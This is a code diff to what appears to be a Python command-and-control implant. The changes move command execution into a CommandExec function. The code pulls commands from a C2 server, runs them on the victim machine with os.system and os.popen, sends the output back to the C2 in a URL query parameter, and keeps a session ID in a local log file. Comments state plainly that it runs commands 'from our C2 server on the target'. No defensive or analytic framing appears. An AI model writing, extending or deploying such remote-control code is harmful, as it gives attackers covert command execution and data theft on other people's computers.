@@ -58,6 +58,16 @@ def ChangeDir(cwd, newDir):
         urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
     return cwd
 
+def CommandExec():
+    command = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}').read().decode("utf-8")
+    os.system(command) #runs the command from our C2 server on the target
+    commanddata = os.popen(command)
+    commanddatatext = urllib.parse.quote_plus(commanddata.read())
+
+    #Send command output to C2
+    urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
+    return
+
 #initialiazation, this will set establish a Session ID
 if(os.path.isfile("sid.log")):
     sid = open("sid.log", "r").read()
@@ -67,14 +77,3 @@ else:
     f = open("sid.log", "w")
     f.write(sid)
     f.close()
-
-# Command execution
-time.sleep(2)
-response = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}')
-command = response.read().decode("utf-8")
-os.system(command) #runs the command from our C2 server on the target
-commanddata = os.popen(command)
-commanddatatext = urllib.parse.quote_plus(commanddata.read())
-
-#Send command output to C2
-urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
